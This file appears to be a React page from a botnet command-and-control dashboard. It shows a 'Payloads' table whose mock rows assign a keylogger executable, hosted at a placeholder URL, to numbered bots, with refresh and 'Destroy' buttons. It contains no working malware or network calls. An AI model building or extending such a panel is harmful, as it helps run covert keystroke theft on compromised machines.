"use client"

import {Spacer, Table, TableBody, TableCell, TableColumn, TableHeader, TableRow} from "@nextui-org/react";
import {Button} from "@nextui-org/button";
import {LuRefreshCw} from "react-icons/lu";
import {Chip} from "@nextui-org/react";


interface RowData {
    name: string;
    status: string;
    link: string;
    to: string;
    platform: string;
}


export default function Payloads() {

    const rowsData : RowData[] = [
        {
            name: "Keylogger",
            status: "active",
            link: "https://server.com/payloads/keylogger.exe",
            to: "Bot 1",
            platform: "x86"
        },
        {
            name: "Keylogger",
            status: "active",
            link: "https://server.com/payloads/keylogger.exe",
            to: "Bot 2",
            platform: "x86"
        },
        {
            name: "Keylogger",
            status: "paused",
            link: "https://server.com/payloads/keylogger.exe",
            to: "Bot 6",
            platform: "x86"
        },
    ]

    const statusColorMap = {
        active: "success",
        paused: "danger",
    };

    // @ts-ignore
    return (
        <div>
            <nav className={"flex justify-between"}>
                <h1 className={"block font-sans text-5xl font-semibold leading-tight tracking-normal text-inherit antialiased"} >Payloads</h1>
                <Button color="primary" variant="bordered"  startContent={<LuRefreshCw/>}>
                    Refresh
                </Button>
            </nav>
            <Spacer y={4}/>
            <section className={"flex gap-4"}>
                <Table aria-label="Example static collection table">
                    <TableHeader>
                        <TableColumn>NAME</TableColumn>
                        <TableColumn>STATUS</TableColumn>
                        <TableColumn>LINK</TableColumn>
                        <TableColumn>TO</TableColumn>
                        <TableColumn>PLATFORM</TableColumn>
                        <TableColumn>ACTIONS</TableColumn>
                    </TableHeader>
                    <TableBody>
                        {rowsData.map((row, index) => (
                            <TableRow key={index}>
                                <TableCell>{row.name}</TableCell>
                                <TableCell>
                                    <Chip key={row.status} color={statusColorMap[row.status ]} size="sm" variant="flat">
                                        {row.status}
                                    </Chip>
                                </TableCell>
                                <TableCell>{row.link}</TableCell>
                                <TableCell>{row.to}</TableCell>
                                <TableCell>{row.platform}</TableCell>
                                <TableCell>
                                    <Button color="danger" variant="bordered">
                                        Destroy
                                    </Button>
                                </TableCell>
                            </TableRow>
                        ))}
                    </TableBody>
                </Table>
            </section>
        </div>
    )

}
